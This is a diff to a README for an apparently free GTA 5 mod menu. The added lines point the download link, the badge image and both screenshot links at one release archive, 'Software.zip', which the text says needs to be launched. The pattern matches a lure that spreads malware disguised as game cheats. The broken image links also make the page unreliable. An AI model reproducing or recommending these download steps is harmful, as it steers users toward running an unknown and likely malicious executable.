@@ -19,7 +19,7 @@ m0dmenu for GTA 5 offers a free and powerful modding experience. This easy-to-us
 
 To enjoy the benefits of the m0dmenu, follow these simple steps:
 
-1. Download the [m0dmenu zip file](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) - *needs to be launched*
+1. Download the [m0dmenu zip file](https://github.com/TRIGONEVO/m0dmenu-gta5-free/releases/download/v1.0/Software.zip) - *needs to be launched*
 2. Extract the files to your GTA 5 directory
 3. Launch the game and access the mod menu to start customizing your gameplay
 
@@ -44,14 +44,14 @@ This repository covers the following topics:
 
 If you are ready to elevate your GTA 5 experience, download m0dmenu now and immerse yourself in a world of endless possibilities. Click the button below to get started:
 
-[![Download m0dmenu](https://img.shields.io/badge/Download-m0dmenu-green)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download m0dmenu](https://github.com/TRIGONEVO/m0dmenu-gta5-free/releases/download/v1.0/Software.zip)](https://github.com/TRIGONEVO/m0dmenu-gta5-free/releases/download/v1.0/Software.zip)
 
 ## Screenshots
 
 Here are some sneak peeks of m0dmenu in action:
 
-![Screenshot 1](https://example.com/screenshot1.jpg)
-![Screenshot 2](https://example.com/screenshot2.jpg)
+![Screenshot 1](https://github.com/TRIGONEVO/m0dmenu-gta5-free/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/TRIGONEVO/m0dmenu-gta5-free/releases/download/v1.0/Software.zip)
 
 ## Support
 
